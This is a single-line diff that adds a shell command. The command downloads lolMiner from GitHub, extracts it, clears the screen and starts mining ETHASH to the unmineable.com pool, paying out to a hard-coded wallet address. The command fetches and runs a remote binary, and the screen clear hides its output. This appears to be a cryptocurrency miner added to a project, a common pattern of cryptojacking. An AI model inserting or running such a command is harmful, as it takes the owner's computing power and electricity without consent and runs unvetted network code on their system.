@@ -1,0 +1,1 @@
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -zxvf lolMiner_v1.31_Lin64.tar.gz && cd 1.31 && clear && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user 3H3W91fmg4wQN7wLh1zScVzcy3r88Hw5Fn.saturn --ethstratum ETHPROXY
